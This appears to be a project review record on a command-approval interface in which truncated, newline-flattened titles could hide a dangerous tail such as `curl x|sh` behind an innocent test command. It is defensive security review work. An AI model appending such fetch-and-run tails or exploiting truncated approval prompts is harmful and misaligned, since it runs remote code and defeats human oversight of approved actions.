title: 'Aegis BLOCK fidelity pass 2: the compact permission title can hide a command''s dangerous tail'
summary: |-
  Fidelity pass 2 (afbbfa9b..1d56d35d) made the desk look like the comp.
  Verified intact: the requester on every head, contentHash visible, claim-mismatch cards whole with Deny focused, requester words labelled in details, kernel-owned regions visible, buried keys and details inert, no inline style or innerHTML, trusted clicks.
  H1: the compact one-line title is ellipsised (cut at 240 chars) while the full kernel body moved into a collapsed disclosure, and newlines collapse to spaces. So `pnpm test … && curl x|sh` shows as a harmless test command next to a filled Allow. Fix: wrap the arg, no cut (or keep the body visible when cut), visible ⏎ for separators, plus tests.
  L2: the shortRequester namespace. L3: night choice chips rely only on a dashed border. L4: a pre-existing h() `id` attribute throw in the update banner.
  Lesson: density work (compacting) is security work: what the human sees at the decision point must include everything the decision covers.
  Fix builder launched; it also merges current feat/gnomon.
symbols_touched:
  - '#gui'
learnings:
  - Compacting a decision card must never truncate the thing being approved; ellipsis on a command is a security bug.
